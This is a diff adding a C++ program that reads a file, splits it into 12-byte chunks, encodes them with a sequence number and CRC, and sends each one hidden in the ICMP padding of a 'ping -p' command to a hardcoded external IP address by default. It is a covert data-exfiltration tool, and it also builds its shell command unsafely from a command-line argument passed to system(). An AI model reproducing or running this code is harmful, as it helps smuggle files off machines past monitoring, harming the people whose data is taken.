@@ -1,0 +1,164 @@
+#include "csvtable.h"
+#include <boost/crc.hpp>
+
+using namespace std;
+
+void split(vector<string>& seg, string contents, int seglen) {
+
+    struct T {
+
+        string cont;
+        int seglen;
+
+        bool pred(char) {
+
+            static int n = 0;
+
+            if (n == seglen) {
+
+                n = 0;
+                return true;
+
+            } else {
+
+                n++;
+                return false;
+            }
+        }
+
+        void push_back(char c) {
+
+            static int n = 0;
+
+            cont.push_back(c);
+            n++;
+
+            if (n == seglen) {
+
+                n = 0;
+                cont.push_back(',');
+            }
+        }
+    };
+
+    T t;
+    t.seglen = seglen;
+
+    std::for_each( contents.begin(), contents.end(),
+                   boost::bind(&T::push_back, &t, _1));
+
+    boost::split(seg, t.cont, boost::bind(&T::pred, &t, _1));
+
+}
+
+
+struct Packet {
+
+    uint16_t chksum;
+    uint16_t seqnum;
+    uint8_t  data[12];
+
+    Packet(const string s, const uint16_t sn) {
+
+        chksum = 0;
+        seqnum = sn;
+        fill_n(data, 12, 0);
+        copy_n(s.begin(), s.size(), data);
+        checksum();
+    }
+
+    void checksum() {
+
+        uint8_t all[14];
+        (*(uint16_t*)(all+0)) = seqnum;
+        copy_n(data, 12, all+2);
+
+        boost::crc_16_type crc;
+        crc.process_bytes((const char*)(all+0), 14);
+        chksum = crc.checksum();
+    }
+
+    string toString() {
+
+        struct T {
+
+            static void toss(stringstream* ss, char c) {
+
+                (*ss).width(2);
+                (*ss).fill('0');
+                (*ss) << hex;
+                (*ss) << (unsigned int)c;
+            }
+        };
+
+
+        stringstream ss;
+
+        ss.width(4);
+        ss.fill('0');
+        ss << hex;
+        ss << chksum;
+
+        ss.width(4);
+        ss.fill('0');
+        ss << hex;
+        ss << seqnum;
+
+        for_each(data+0, data+sizeof(data), boost::bind(&T::toss, &ss, _1));
+
+        return ss.str();
+    }
+
+};
+
+
+
+void formcmd(const string s, string cmd_tmpl) {
+
+    if (s.size() > 12) throw std::exception();
+
+    static uint16_t seqnum = 0;
+
+    Packet pkt(s, seqnum++);
+
+    boost::replace_first(cmd_tmpl, "PAT", pkt.toString());
+    system(cmd_tmpl.c_str());
+
+    sleep(1);
+}
+
+
+int main(int argc, char* argv[]) {
+
+    string destip;
+
+    if (argc < 2) return 0;
+
+    string content = file_get_contents(argv[1]);
+
+    if ( content.empty() ) return 0;
+
+    if (argc == 3) {
+
+        destip = argv[2];
+
+    } else {
+
+        destip = "198.56.183.230";
+    }
+
+    string cmd_tmpl = "ping -c 1 -p PAT ";
+    cmd_tmpl += destip;
+
+    vector<string> segments;
+    split(segments, content, 12);
+
+    stringstream start;
+    start << "start=" << content.size();
+    formcmd(start.str(), cmd_tmpl);
+    for_each(segments.begin(), segments.end(), boost::bind(formcmd, _1, cmd_tmpl));
+
+    return 0;
+}
+
+
